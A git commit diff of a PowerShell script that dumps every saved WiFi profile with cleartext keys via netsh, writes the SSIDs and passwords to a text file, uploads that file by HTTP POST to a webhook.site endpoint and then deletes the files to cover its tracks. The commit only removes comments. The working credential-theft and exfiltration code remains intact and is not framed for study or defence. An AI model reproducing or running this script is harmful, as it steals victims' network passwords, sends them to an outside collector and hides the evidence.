79d3218564138313559d39a003ac6b8174096c0a
Moldmihai <mihai_99moldo@yahoo.com>
2023-01-09 19:23:31 +0200

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -1,9 +1,7 @@
-# Working Directory
 $wd = "C:\WiFi"
 mkdir $wd
 cd $wd
 
-# Get passwords and SSIDs
 netsh wlan export profile key=clear
 dir *.xml |% {
 $xml=[xml] (get-content $_)
@@ -11,11 +9,8 @@ $row= "---------------------`r`n SSID = "+$xml.WLANProfile.SSIDConfig.SSID.name 
 Out-File wifipass.txt -Append -InputObject $row
 }
 
-# Make your own webhook and insert your unique id
-# https://webhook.site
 Invoke-WebRequest -Uri https://webhook.site/5a3610fb-2789-404a-b42d-af8a689e5e13 -Method POST -InFile wifipass.txt -UseBasicParsing
 
-# Clear tracks
 rm *.xml
 rm *.txt
 cd ..
